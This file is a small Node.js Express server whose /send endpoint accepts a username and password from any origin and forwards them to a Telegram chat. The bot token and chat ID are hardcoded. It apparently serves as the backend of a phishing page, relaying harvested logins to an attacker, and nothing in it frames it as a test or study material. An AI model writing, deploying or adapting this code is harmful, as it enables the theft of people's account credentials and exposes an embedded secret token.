import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';

const app = express();
const BOT_TOKEN = '8434307879:AAFG2h5Z59_7JPziceP4E2Exksk7wuVmuXM';
const CHAT_ID = '7527317470';

app.use(cors());
app.use(express.json());

app.post('/send', async (req, res) => {
  const { username, password } = req.body;
  const message = `📩 Username: ${username}\n🔑 Password: ${password}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    if (response.ok) {
      res.status(200).send('Message sent to Telegram');
    } else {
      res.status(500).send('Failed to send message');
    }
  } catch (error) {
    res.status(500).send('Error sending message');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
